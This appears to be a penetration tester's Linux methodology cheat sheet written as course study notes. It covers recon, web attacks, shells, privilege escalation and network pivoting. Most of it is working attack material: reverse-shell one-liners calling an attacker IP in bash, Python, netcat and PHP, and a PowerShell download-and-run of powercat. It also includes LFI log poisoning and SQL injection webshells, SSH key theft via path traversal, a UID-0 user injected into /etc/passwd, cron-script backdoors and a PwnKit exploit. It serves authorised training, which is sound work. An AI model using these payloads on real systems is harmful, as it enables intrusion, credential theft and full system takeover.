# Linux Methodology

Part of [[METHODOLOGY CHEAT SHEET]]. Recon → web app exploitation → shells → privilege escalation, phase-ordered.

---

### Phase 1: Reconnaissance

#### Step 1: Port Scanning
```bash
# Quick TCP scan (top 1000 ports)
nmap -v -sS -sV -Pn --top-ports 1000 -oA nmap_quick <target>

# Full TCP scan (all ports)
nmap -sT -p- --min-rate 5000 --max-retries 1 -oA nmap_full <target>

# UDP scan (top 100)
nmap -v -sU -T4 -Pn --top-ports 100 -oA nmap_udp <target>
```

**What to look for**:
- Open ports and service versions
- SSH (22) - potential weak credentials
- HTTP (80, 443) - web apps
- SMB (139, 445) - file shares
- FTP (21) - anonymous login
- SMTP (25) - user enumeration
- SNMP (161) - misconfigurations
- MySQL/PostgreSQL (3306, 5432) - default creds

#### Step 1b: DNS Enumeration
> Full walkthrough (WHOIS, Google dorking, passive OSINT, LLM-assisted wordlists): [[06. Information Gathering|Information Gathering]]

```bash
# Basic record lookups
host <domain>
host -t mx <domain>
host -t txt <domain>

# Forward brute force against a wordlist
for ip in $(cat list.txt); do host $ip.<domain>; done

# Reverse brute force across a discovered IP range (negative-grep filters out the noise)
for ip in $(seq <start> <end>); do host <subnet>.$ip; done | grep -Ev "not found|timed out"

# Automated all-in-one tools
dnsrecon -d <domain> -t std
dnsenum <domain>
```
*Worth doing before or alongside port scanning, not as an afterthought, a discovered subdomain or internal hostname often reveals a whole second attack surface a plain IP-based scan would never find. Full syntax reference: [[Reconnaissance & Enumeration#DNS Enumeration|Command Appendix]].*

#### Step 1c: Vulnerability Scanning
> Full walkthrough (Nessus install/scan/analysis, Nmap NSE vuln scripts): [[07. Vulnerability Scanning|Vulnerability Scanning]]

```bash
# Lightweight, targeted: NSE against whatever ports the earlier scan found open
sudo nmap -sV -p <port> --script "vuln" <target>

# Nessus: GUI-driven, heavier, broader plugin coverage (168,000+ plugins). Install/CLI
# reference: [[Reconnaissance & Enumeration#Nessus (Install & CLI)|Command Appendix]]
```
*Automated results are a starting point, never the final word, false positives and false negatives both happen. Always confirm a flagged CVE manually (`curl` the disclosed PoC, or find a matching NSE/searchsploit exploit) before treating it as confirmed.*

#### Step 2: Web Application Enumeration
> Full walkthrough (Nmap web fingerprinting, Wappalyzer, Gobuster incl. API pattern brute force, Burp Suite Proxy/Repeater/Intruder, XSS): [[08. Introduction to Web Application Attacks|Introduction to Web Application Attacks]]

```bash
# Web server fingerprinting
nmap -p80 -sV <target>
nmap -p80 --script=http-enum <target>

# Directory brute force
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,sh,cgi

# API path brute force (pattern file containing {GOBUSTER}/v1 etc.)
gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/big.txt -p pattern

# Tech stack identification
whatweb http://<target>
wpscan --url http://<target> --enumerate p,vt

# robots.txt / sitemap check
curl http://<target>/robots.txt
```

**Proxy everything through Burp before manual testing:** launch with `burpsuite`, Intercept off, point the browser's manual proxy config at `127.0.0.1:8080`. Full setup + Repeater/Intruder syntax: [[Web Applications#Burp Suite|Command Appendix]].

**What to look for**:
- `/admin`, `/login`, `/dashboard`
- `robots.txt` - hidden paths
- `config.php`, `wp-config.php` - config files
- `.git` - source code exposure
- `/uploads` - file upload vulnerabilities
- `/cgi-bin` - potential RCE
- API endpoints (`/<name>/v1`, `/<name>/v2`) - probe with `curl`, watch for `405` vs `404` to confirm a path exists under a different HTTP method
- Stored/reflected XSS - test `< > ' " { } ;` in any input that gets echoed back unsanitized

#### Step 3: Service-Specific Enumeration
```bash
# SMB
enum4linux <target>
smbclient -U guest -L //<target>

# FTP
ftp <target>  # Try anonymous login

# SMTP
nc -nv <target> 25
VRFY root
EXPN mail

# SNMP
snmpwalk -c public -v1 <target>
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>

# NFS
showmount -e <target>
mount -t nfs <target>:/share /mnt/nfs
```

---

### Phase 2: Initial Foothold

#### Step 1: Service Exploitation
```bash
# Weak credentials
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4

# Web exploits
searchsploit <software> <version>
# Check GTFOBins for binary exploitation

# SQL injection (manual first)
sqlmap -u "http://target/page?id=1" --batch
```

#### Step 1a: Fixing a Public Web Exploit
> Full walkthrough (checklist, CSRF debugging worked example): [[14. Fixing Exploits#14.2. Fixing Web Exploits|Fixing Exploits, 14.2]]

**Checklist before touching a downloaded web exploit's code:** HTTP or HTTPS? Specific path/route assumed? Pre-auth or does it need to log in itself? Default install path assumed? Self-signed cert likely to break `requests`/`urllib` calls outright?

```python
# Fix target URL/protocol, TLS verification, and credentials to match the real target
base_url = "https://<real-target>/admin"
response = requests.post(url, data=data, verify=False)   # skip self-signed cert errors
username, password = "<real-user>", "<real-pass>"
```
**Confusing downstream error after auth succeeds** (`IndexError`, `KeyError`, etc)? Don't assume the exploit's broken, print the actual data right before the failing line, a hardcoded param name (CSRF token field, etc) not matching this target's real one is a common cause:
```python
print("[+] Actual value: " + location)   # see what the target really sent back
```

Full syntax: [[Fixing Exploits (Breakdowns)|Command Breakdowns]]. Troubleshooting: [[Fixing Exploits (Decision Tree)|Decision Tree]].

#### Tags: #FixingExploits #WebExploits #CSRFDebugging

---

#### Step 1b: Web Application Exploitation
> Full walkthrough (Directory Traversal, File Inclusion, File Upload, Command Injection): [[09. Common Web Application Attacks|Common Web Application Attacks]]
> Quick symptom-to-technique lookup: [[DECISION TREE]]

```bash
# Directory Traversal / LFI probe. Swap in likely parameter names (page, file, path, template, doc...)
curl "http://<target>/index.php?page=../../../../../../../../../etc/passwd"
curl "http://<target>/index.php?page=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"   # URL-encoded variant
curl "http://<target>/index.php?page=..\..\..\..\..\..\windows\system32\drivers\etc\hosts"  # Windows target, try backslash too

# If plain ../ 404s / gets filtered, try percent-encoding the dots. Bypasses filters matching only the literal string
curl "http://<target>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
# Apache CVE-2021-41773/42013 specifically wants an asymmetric first segment. Try this exact pattern if the uniform one above 404s regardless of depth:
curl --path-as-is "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Grafana CVE-2021-43798 (any core plugin path works, alertlist always present, no auth needed)
curl http://<target>:3000/api/health   # confirm version is 8.0.0-beta1 through 8.3.0
curl --path-as-is "http://<target>:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd"

# Extract a multi-line secret (private key, cert) found via traversal. NEVER copy/paste manually, extract mechanically
curl -s "http://<target>/index.php?page=../../../../../../home/<user>/.ssh/id_rsa" -o raw_response.txt
sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p' raw_response.txt > stolen_key
chmod 400 stolen_key
ssh -i stolen_key <user>@<target>   # add -p <port> if non-standard
```

**What to look for (traversal/LFI)**:
- Any parameter whose value looks like a filename (`page=`, `file=`, `template=`, `lang=`). Classic LFI/traversal injection point
- `/etc/passwd` (Linux) or `C:\Windows\System32\drivers\etc\hosts` (Windows) to confirm the traversal works at all
- Once confirmed, hunt disclosed usernames' home directories for `.ssh/id_rsa`. Often world-readable, a direct path to a shell via SSH
- On Windows, no direct traversal-to-shell equivalent exists. Research the specific web server/framework's known sensitive file paths instead (e.g. IIS: `C:\inetpub\wwwroot\web.config`, `C:\inetpub\logs\LogFiles\W3SVC1\`)
- If a retrieved secret fails to load with a vague "unsupported"/"can't parse" error from **any** tool, suspect transcription corruption first. Re-extract mechanically and `diff` before chasing library-compatibility theories

```bash
# LFI to RCE via log poisoning (Linux, Apache). Inject a PHP snippet through a controllable header, then include the log
curl "http://<target>/index.php?page=../../../../../../../../../var/log/apache2/access.log"   # confirm User-Agent lands in the log
# In Burp Repeater: set User-Agent to <?php echo system($_GET['cmd']); ?>, send, then remove the header and re-request with:
#   page=../../../../../../../../../var/log/apache2/access.log&cmd=<command>   (URL-encode spaces as %20)
# Windows/XAMPP log path instead: xampp/apache/logs/access.log

# php://filter to read PHP source instead of executing it
curl "http://<target>/index.php?page=php://filter/convert.base64-encode/resource=<file>.php"
echo "<base64 output>" | base64 -d

# data:// wrapper, inline payload, no log/file write needed (requires allow_url_include)
curl "http://<target>/index.php?page=data://text/plain,<?php%20echo%20system('id');?>"

# RFI, host your own payload and include it remotely (also requires allow_url_include)
cd /usr/share/webshells/php/ && python3 -m http.server 80
curl "http://<target>/index.php?page=http://<your_ip>/simple-backdoor.php&cmd=id"

# Executable file upload, try direct .php first, then bypass tricks if blocked
# Case-swap extension (.pHP), alternate extensions (.phps, .php7), or upload as .txt then rename via the app
curl "http://<target>/uploads/shell.pHP?cmd=id"

# Same idea on IIS/ASP.NET: Kali ships a ready webshell, upload via the browser (ASP.NET WebForms
# viewstate tokens are fiddly to hand-craft with curl), then drive it from the browser directly
ls /usr/share/webshells/aspx/   # cmdasp.aspx
curl http://<target>/cmdasp.aspx   # confirm it landed once uploaded

# Upload + traversal combo (upload mechanism has no code-execution path at all)
# Intercept the upload in Burp, rewrite the multipart filename field to a traversal path targeting authorized_keys:
#   filename="../../../../../../../root/.ssh/authorized_keys"   (content = your own fileup.pub)
ssh-keygen -f fileup && cat fileup.pub > authorized_keys
rm ~/.ssh/known_hosts   # if the hostname was used for an earlier, different box
ssh -i fileup root@<target>   # add -p <port> if non-standard

# Command injection: identify by replacing a command-shaped parameter value entirely, then narrowing down what the filter blocks
curl -X POST --data 'param=<harmless-os-command>' http://<target>/<endpoint>   # e.g. ipconfig / id
curl -X POST --data 'param=<expected-command>' http://<target>/<endpoint>       # confirm the base command alone still works
curl -X POST --data 'param=<expected-command>%3B<injected-command>' http://<target>/<endpoint>   # %3B = URL-encoded ; chains a second command
# Also try && and (CMD only) a single &, in case ; specifically is filtered

# Detect CMD vs PowerShell on Windows (credit: PetSerAl)
# (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell    -> URL-encode and chain after the expected command

# PowerShell reverse shell via Powercat, once you know you're in a PowerShell context
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
# Inject (URL-encoded): IEX (New-Object System.Net.Webclient).DownloadString("http://<your_ip>/powercat.ps1");powercat -c <your_ip> -p 4444 -e powershell

# Linux reverse shell via command injection, if unfiltered enough to send it directly
# IMPORTANT: use --data-urlencode, not --data, whenever the payload contains & = or spaces
# --data sends the value raw (application/x-www-form-urlencoded), so a literal & in a reverse shell
# one-liner (>&, 0>&1) gets read as a form-field separator and silently truncates your payload
curl -X POST --data-urlencode 'Archive=bash -c "bash -i >& /dev/tcp/<your_ip>/4444 0>&1"' http://<target>/archive

# No git/command-shaped hint at all? Work through injection types systematically, watch for ANY change
# in behavior (blank/different response), not just a direct hit
curl -X POST --data 'param=1%2B1' http://<target>/<endpoint>       # eval()? expect "2" back if so
curl -X POST --data 'param={{7*7}}' http://<target>/<endpoint>     # Jinja2 SSTI? expect "49" back if so
curl -X POST --data-urlencode 'param=`id`' http://<target>/<endpoint>          # plain OS injection via backticks
curl -X POST --data-urlencode 'param=$(id)' http://<target>/<endpoint>        # or command substitution
```

**What to look for (LFI/RFI/upload/command injection)**:
- A `.php` file included via the vulnerable parameter executes rather than displays. That's the LFI/traversal distinction, use `php://filter` if you need the source instead
- `allow_url_include` gates both `data://` and RFI. If either fails outright, fall back to log poisoning
- `python3 -m http.server` serves whatever directory it was launched from. `cd` into the right folder immediately before starting it, and check its access log for a `200` (not `404`) before assuming a listener is broken
- Upload forms: try the same filename twice (an "already exists" response can brute-force server file/directory names), and check whether the `filename` field itself accepts a relative path even if the upload content can't be executed
- Sending a payload via `curl -X POST --data` and it fails/truncates for no obvious reason? Check for `&`, `=`, or spaces in it and switch to `--data-urlencode`
- Web server processes on training VMs are frequently already root/SYSTEM. Check `whoami`/`id` the moment code execution lands, before assuming you need to escalate
- Any form/parameter whose value looks like a shell command (a URL for `git clone`, a filename for a system tool, etc) is worth testing for command injection
- No obvious command-shaped hint? A response going **blank** instead of echoing your literal input back is itself a signal something got evaluated, even if the specific payload's side effect (a callback, etc) doesn't land. Don't rule out injection just because nothing visibly changed on a simple test
- `git version` output tells you Windows vs Linux in one shot (Windows appends `.windows.N` to the version string)

#### Step 1c: SQL Injection
> Full walkthrough: [[10. SQL Injection Attacks|SQL Injection Attacks]]

```bash
# Connect directly to a DB (useful when creds are already known, or after finding them elsewhere)
mysql -u root -p'root' -h <target> -P 3306 --skip-ssl-verify-server-cert   # add --skip-ssl if TLS errors
impacket-mssqlclient <user>:<pass>@<target> -windows-auth

# Auth bypass in a login form's username field
offsec' OR 1=1 -- //

# Error-based enumeration (leaks values through DB error messages)
' or 1=1 in (select @@version) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

# UNION-based: find column count first, then enumerate
' ORDER BY 1-- //                                  # increment until it errors, that's the count - 1
' UNION SELECT null,null,database(),user(),@@version -- //   # shift string values off any integer-typed column
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

# Blind SQLi tests (no visible output; infer from behavior/timing instead)
<target>?user=offsec' AND 1=1 -- //                          # boolean-based
<target>?user=offsec' AND IF (1=1, sleep(3),'false') -- //   # time-based

# MySQL: write a webshell to disk via UNION + INTO OUTFILE (needs a writable web-servable path)
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
curl "http://<target>/tmp/webshell.php?cmd=id"

# MSSQL: enable and use xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

# PostgreSQL: error-based extraction via CAST() type-mismatch (leaks the value, no truncation cap)
' UNION SELECT NULL,CAST((SELECT version()) AS int),NULL-- 

# PostgreSQL: RCE, superuser only (check first: SELECT usesuper FROM pg_user).
# Needs stacked queries (works via PHP's pg_query(), not mysqli_query()) and a landing table
'; CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM '<command>'; -- 
' UNION SELECT NULL,CAST((SELECT string_agg(cmd_output,' | ')) AS int),NULL FROM cmd_exec-- 

# Automate with sqlmap
sqlmap -u "http://<target>/page.php?id=1" -p id                 # discovery/fingerprint
sqlmap -u "http://<target>/page.php?id=1" -p id --dump           # dump current DB
sqlmap -r post.txt -p <param> --os-shell --web-root "/var/www/html/tmp"   # full OS shell (capture POST via Burp first)
```

**What to look for (SQL injection)**:
- Any input that gets used to build a query (login forms, search boxes, IDs in a URL) is worth testing with a single `'` first, a resulting DB error confirms in-band injection
- UNION SQLi needs the same column count and compatible types, use `ORDER BY` to find the count, then a `UNION SELECT` of dummy string values to see which columns actually render
- A column that silently doesn't display (rather than erroring) is often an integer-typed column rejecting a string value, shift your enumeration functions to a different column
- No visible output difference at all doesn't mean it's not injectable, boolean/time-based blind SQLi infers results from behavior or timing instead (same "blank response is still a signal" idea as command injection above)
- sqlmap is loud, avoid it on stealth-sensitive engagements
- `INTO OUTFILE` (MySQL), `xp_cmdshell` (MSSQL), and `COPY ... FROM PROGRAM` (PostgreSQL, superuser only) are the three DBMS-specific paths from SQLi to OS command execution seen so far, sqlmap's `--os-shell` automates the MySQL one
- PostgreSQL backends via PHP's `pg_query()` allow stacked (`;`-separated) queries in a single call, unlike MySQL's `mysqli_query()`, which needs `mysqli_multi_query()` explicitly, worth checking for this whenever the backend is confirmed Postgres

#### Step 1d: Phishing (Credential Capture)
> The technique (clone a login page, patch it, capture credentials) is genuinely OS-agnostic, it targets the person, not the target machine's OS, so the full writeup lives once in [[Windows Methodology#Step 1c: Phishing (Credential Capture)|Windows Methodology's Step 1c]] rather than being duplicated here. Full walkthrough: [[11. Phishing Basics|Phishing Basics]].

#### Step 2: Shells & Payloads

**Netcat**:
```bash
# Reverse shell
nc <attacker_ip> 4444 -e /bin/bash

# Attacker listener
rlwrap nc -nlvp 4444
```

**Bash**:
```bash
bash -c "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"
```

**Python**:
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP**:
```php
<?php echo shell_exec("/bin/bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1");?>
```

**MSFVenom**:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
./shell.elf
```

#### Step 3: Upgrade Shell
```bash
# TTY shell
python -c 'import pty;pty.spawn("/bin/bash");'

# Full TTY
# Press Ctrl+Z
stty raw -echo
fg
export TERM=xterm-256color
```

---

### Phase 3: Privilege Escalation

> Full technique walkthroughs: [[18. Linux Privilege Escalation|Linux Privilege Escalation]] (Module 18). Decision tree: [[Linux Privilege Escalation (Decision Tree)]]. Command reference: [[Linux Privilege Escalation]].

#### Step 1: Manual Situational Awareness

Run this checklist immediately on landing a shell. Each item is a potential privesc path on its own.

```bash
# Who am I? Which groups? (sudo, docker, lxd, disk, adm = privesc-relevant groups)
id

# OS + kernel + arch (needed for kernel exploit hunting)
cat /etc/issue && uname -r && arch

# Who else has an interactive shell account?
cat /etc/passwd | grep -v nologin | grep -v false

# Active processes (look for root-owned scripts, unusual daemons)
ps aux

# Network (two interfaces = pivot potential; 127.0.0.1 listeners = local-only services)
ip a && ss -anp

# Cron jobs (look for root-owned jobs calling writable scripts)
grep "CRON" /var/log/syslog 2>/dev/null || cat /var/log/cron.log 2>/dev/null
ls -lah /etc/cron*

# Writable files (especially /etc/passwd, cron scripts, service configs)
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# SUID binaries (anything non-standard → GTFOBins immediately)
find / -perm -u=s -type f 2>/dev/null

# Capabilities (cap_setuid+ep on scripting language = root)
/usr/sbin/getcap -r / 2>/dev/null

# Sudo permissions
sudo -l

# Environment variables and dotfiles (credentials left in plaintext)
env
cat ~/.bashrc ~/.bash_history ~/.zshrc 2>/dev/null
```

#### Step 2: Automated Enumeration Pass

```bash
# unix-privesc-check (pre-installed on Kali, fast, low noise)
scp /usr/bin/unix-privesc-check user@<TARGET>:~/
./unix-privesc-check standard 2>/dev/null | grep -A 2 "WARNING"

# LinPEAS (more comprehensive, colour-coded red/yellow = high confidence)
# Download: https://github.com/carlospolop/PEASS-ng/releases
chmod +x linpeas.sh
./linpeas.sh 2>/dev/null | tee linpeas_output.txt
# See [[LinPEAS]] for reading the output
```

#### Step 3a: Credential Hunting (Module 18.2)

```bash
# Try found credential against root immediately
su - root

# Build targeted wordlist from partial credential (e.g. Lab+3 digits)
crunch 6 6 -t Lab%%% > wordlist.txt
hydra -l <user> -P wordlist.txt <target_ip> -t 4 ssh -V

# Sniff loopback if tcpdump is allowed via sudo
watch -n 1 "ps -aux | grep pass"          # passively watch for cleartext in process args
sudo tcpdump -i lo -A | grep "pass"       # catch cleartext credentials in local service traffic
```

#### Step 3b: Insecure File Permissions (Module 18.3)

**Cron job with writable script:**
```bash
# Find root-owned cron job calling a writable script
grep "CRON" /var/log/syslog | grep root   # or cat /var/log/cron.log
ls -lah /path/to/script.sh                # look for -rwxrwxrw- or -rwxrwxrwx

# Inject reverse shell (append -- never overwrite)
echo >> /path/to/script.sh
echo "bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1" >> /path/to/script.sh
nc -lnvp <PORT>   # wait up to one cron interval (~60 sec)
```

**/etc/passwd world-writable:**
```bash
ls -lah /etc/passwd                                             # confirm -rw-rw-rw-
openssl passwd w00t                                             # generate hash
echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd   # inject UID 0 user
su root2                                                        # switch: password is w00t
```

#### Step 3c: SUID + Capabilities (Module 18.4.1)

```bash
# SUID binary exploitation (GTFOBins → SUID filter)
find / -perm -u=s -type f 2>/dev/null
find . -exec /bin/sh -p \; -quit          # if find is SUID
bash -p                                   # if bash is SUID

# Capabilities (GTFOBins → Capabilities filter)
/usr/sbin/getcap -r / 2>/dev/null
# cap_setuid+ep on gdb:
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
# cap_setuid+ep on perl:
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

#### Step 3d: Sudo Abuse (Module 18.4.2)

```bash
sudo -l
# Look up every allowed binary on GTFOBins → filter by Sudo
# Key examples:
sudo apt-get changelog apt    # when less opens: !/bin/sh
sudo gcc -wrapper /bin/sh,-s .
sudo vim -c '!sh'
sudo find / -exec /bin/sh \; -quit

# If GTFOBins technique fails with Permission denied: check AppArmor
cat /var/log/syslog | grep apparmor   # apparmor="DENIED" = blocked, try next binary
```

#### Step 4: Kernel / SUID Binary CVEs (Module 18.4.3)

```bash
# Gather target info
uname -r && arch
pkexec --version       # 0.105 → PwnKit (CVE-2021-4034)
snap --version         # snapd < 2.37.1 → dirty_sock (CVE-2019-7304)

# Search on Kali
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"

# Always compile on the target to avoid glibc mismatch
scp exploit.c user@<TARGET>:~/
# on target: gcc exploit.c -o exploit && ./exploit

# PwnKit (not in searchsploit -- clone from GitHub):
git clone https://github.com/berdav/CVE-2021-4034.git /tmp/pwnkit
scp -r /tmp/pwnkit user@<TARGET>:/tmp/pwnkit
# on target: cd /tmp/pwnkit && gcc -Wall --shared -fPIC -o pwnkit.so pwnkit.c && gcc -Wall cve-2021-4034.c -o cve-2021-4034-local && ./cve-2021-4034-local
```

---

### Phase 4: Pivoting to Adjacent Networks

> Full technique walkthrough: [[19. Port Redirection and SSH Tunneling|Port Redirection and SSH Tunneling]] (Module 19). Decision tree: [[Port Redirection and SSH Tunneling (Decision Tree)]]. Command reference: [[Port Redirection and SSH Tunneling]].

Applies when you have a shell on a host with multiple network interfaces and need to reach an adjacent subnet that Kali can't route to directly.

#### Step 0: Discover internal network layout

```bash
# From the pivot shell: what subnets is this host on?
ip addr
ip route

# Find live hosts in an adjacent subnet (bash nc sweep)
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445 2>&1; done | grep -v "timed out" | grep -v "refused"

# Confirm what services are on a discovered host
nc -zv -w 1 172.16.50.217 22 445 3389 80 443 5432
```

#### Step 1: Pick the right technique

**If Kali can connect inbound to the pivot (pivot port is accessible):**

```bash
# Socat (simplest, if installed on pivot):
socat -ddd TCP-LISTEN:2345,fork TCP:DEST_IP:DEST_PORT

# SSH local port forward (one destination, pivot = SSH client):
ssh -N -L 0.0.0.0:4455:DEST_IP:DEST_PORT user@INTERNAL_SSH_SERVER

# SSH dynamic port forward (multiple destinations, pivot = SSH client):
ssh -N -D 0.0.0.0:9999 user@INTERNAL_SSH_SERVER
# On Kali: socks5 PIVOT_IP 9999 in /etc/proxychains4.conf
```

**If firewall blocks inbound to pivot (must SSH outbound from pivot to Kali):**

```bash
# First: start SSH server on Kali
sudo systemctl start ssh

# SSH remote port forward (one destination, pivot SSHes out to Kali):
ssh -N -R 127.0.0.1:2345:DEST_IP:DEST_PORT kali@KALI_IP -o StrictHostKeyChecking=no

# SSH remote dynamic (multiple destinations, SOCKS proxy opens on Kali):
ssh -N -R 9998 kali@KALI_IP -o StrictHostKeyChecking=no   # OpenSSH 7.6+ client required
# On Kali: socks5 127.0.0.1 9998 in /etc/proxychains4.conf
```

**Prerequisite when SSHing FROM a non-interactive reverse shell:**
```bash
# PTY upgrade first (SSH password prompt needs a real TTY):
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then add -o StrictHostKeyChecking=no (user may lack write to ~/.ssh/known_hosts)
```

**If you have a Meterpreter session on the pivot (no SSH needed):**

```bash
# In msfconsole after catching the session:
bg
use auxiliary/server/socks_proxy
set SRVPORT 9050; set SRVHOST 0.0.0.0; set VERSION 4a
run

sessions -i 1
run autoroute -s <target-subnet>/<mask>
```

Then on Kali: `socks4 127.0.0.1 9050` in `/etc/proxychains4.conf`, and `proxychains` prefix your tools as normal.
No SSH server needed on the pivot, no credentials needed: the Meterpreter channel itself carries the traffic.

**Protocol-restricted environments (egress filtered):**

| Allowed egress | Technique | Tool |
|---|---|---|
| HTTP/HTTPS only | HTTP-tunneled SOCKS | Rpivot or Chisel (forward or reverse) |
| DNS only | DNS tunneling | Dnscat2 |
| ICMP only | ICMP-tunneled TCP | ptunnel-ng |
| RDP only (Windows) | SOCKS over RDP channel | SocksOverRDP + Proxifier |

→ Full syntax for each: [[Port Redirection and SSH Tunneling]]

#### Step 2: Route tools through the pivot

**Via proxychains (SOCKS-based techniques):**
```bash
proxychains nmap -vvv -sT -Pn -n DEST_IP        # -sT mandatory (not -sS), -Pn and -n mandatory
proxychains smbclient -L //172.16.50.217/ -U user --password=pass
proxychains ssh user@INTERNAL_HOST
```

**Via sshuttle (transparent routing, no proxychains prefix needed):**
```bash
# Requires root on Kali + Python3 on pivot
sshuttle -r user@PIVOT_IP:PIVOT_PORT SUBNET/24 SUBNET2/24
# After: connect to internal hosts directly, no proxychains prefix
```

#### Step 3: Clean up and restore proxychains

```bash
# Reset /etc/proxychains4.conf after each lab/engagement:
sudo tail -3 /etc/proxychains4.conf            # check current entry before editing
sudo sed -i 's/socks5 .*/socks4 127.0.0.1 9050/' /etc/proxychains4.conf
# If the sed pattern doesn't match (entry format has drifted), edit manually
```

#### Tags: #Pivoting #PortForwarding #SSHTunneling #Proxychains #Meterpreter #Rpivot #Dnscat2 #ptunnel-ng #SocksOverRDP #Module19 #HTBSupplementary
